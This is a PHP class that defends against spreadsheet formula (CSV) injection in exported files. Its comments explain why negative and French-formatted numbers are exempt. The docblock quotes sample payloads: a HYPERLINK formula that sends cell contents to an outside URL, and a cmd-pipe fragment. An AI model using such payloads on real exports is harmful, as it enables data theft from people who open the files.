<?php

declare(strict_types=1);

namespace Jul6Art\DataflowBundle\Io\Guard;

/**
 * Neutralises a cell a spreadsheet would evaluate as a formula.
 *
 * ## What it exists to stop
 *
 * Excel and LibreOffice **execute** a cell whose first character is `=`, `+`, `-`, `@`, a tab or a
 * carriage return. Any application that exports a customer name, a contact note or an accounting
 * label is exporting text somebody typed, so any of them is exposed: a customer named
 * `=HYPERLINK("http://…"&A1,"Click")` exfiltrates a column the moment an accountant opens the file,
 * and no server-side test would ever show it.
 *
 * This is the reason the writers of this bundle exist as one layer rather than seven call sites.
 * Before the extraction, the two applications of this ecosystem had **eleven** places writing
 * tabular output and **zero** guarding it.
 *
 * ## The numeric filter runs FIRST, and it is not an optimisation
 *
 * ⚠️ A Doctrine `decimal` column is hydrated as a **string**, so a negative amount is `'-100.00'`
 * and starts with a forbidden character. Without the filter, this guard would ship every negative
 * amount of an accounting file as TEXT — it would corrupt the data it protects, and the only person
 * who would notice is the accountant, while reconciling.
 *
 * ⚠️ And the filter has to know the **French** separator. An accounting exporter that formats
 * `-100,00` produces something PHP does not consider numeric; that half was missing in the first
 * implementation, and only a test said so — the comment next to it claimed the opposite. Substituting
 * the comma loosens nothing: a payload that contains one (`-1,5+cmd|…`) is still not numeric
 * afterwards, so it is still neutralised.
 *
 * ## Static and stateless
 *
 * It is a pure function called from writers, from services and from controllers. Injecting it would
 * add nothing and would make a writer test depend on a container.
 */
final class FormulaInjectionGuard
{
    /**
     * Excel's text marker. A cell starting with it is rendered verbatim, the apostrophe itself not
     * displayed.
     */
    private const string TEXT_PREFIX = "'";

    /**
     * ⚠️ The tab and the carriage return belong here: a spreadsheet strips leading whitespace
     * BEFORE interpreting, so `"\t=1+1"` evaluates as `=1+1`.
     *
     * @var list<string>
     */
    private const array FORMULA_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Returns the value untouched when it cannot carry a formula, and prefixed with the text marker
     * when it can. Integers, floats, booleans and `null` pass through: only a string is interpreted
     * by a spreadsheet.
     */
    public static function neutralize(string|int|float|bool|null $value): string|int|float|bool|null
    {
        if (!\is_string($value) || '' === $value) {
            return $value;
        }

        if (\str_starts_with($value, self::TEXT_PREFIX)) {
            return $value;
        }

        if (self::isNumberLike($value)) {
            return $value;
        }

        if (!\in_array($value[0], self::FORMULA_PREFIXES, true)) {
            return $value;
        }

        return self::TEXT_PREFIX.$value;
    }

    /**
     * Guards every cell of a row, preserving order and keys.
     *
     * ⚠️ `array_map` with a single array preserves keys, which is what lets a row indexed by column
     * name and a plain list of cells go through the same call.
     *
     * @template TKey of array-key
     *
     * @param array<TKey, scalar|null> $cells
     *
     * @return array<TKey, scalar|null>
     */
    public static function neutralizeRow(array $cells): array
    {
        return \array_map(
            static fn (string|int|float|bool|null $cell): string|int|float|bool|null => self::neutralize($cell),
            $cells,
        );
    }

    /**
     * `is_numeric()` widened to the French decimal separator.
     */
    private static function isNumberLike(string $value): bool
    {
        return \is_numeric($value) || \is_numeric(\str_replace(',', '.', $value));
    }
}
